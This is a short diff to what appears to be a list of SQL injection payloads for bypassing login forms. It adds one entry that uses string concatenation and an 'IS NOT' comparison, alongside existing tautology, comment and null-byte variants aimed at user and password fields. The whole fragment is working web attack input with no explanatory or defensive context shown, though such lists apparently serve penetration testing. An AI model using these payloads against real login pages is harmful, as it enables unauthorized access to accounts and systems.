@@ -35,6 +35,7 @@
     user=admin' /*&pass=a
     adm'||'in &Pass=' glob '*
     user=ad'||'min'%00&pass=1'+||+'1
+    user:ad'||'min pass:a' IS NOT 'b
     user=1' OR '1'='1%00&pass=a
     user=admin' OR '1'='1';&pass=a
     user=admin' OR '1'='1'--&pass=a
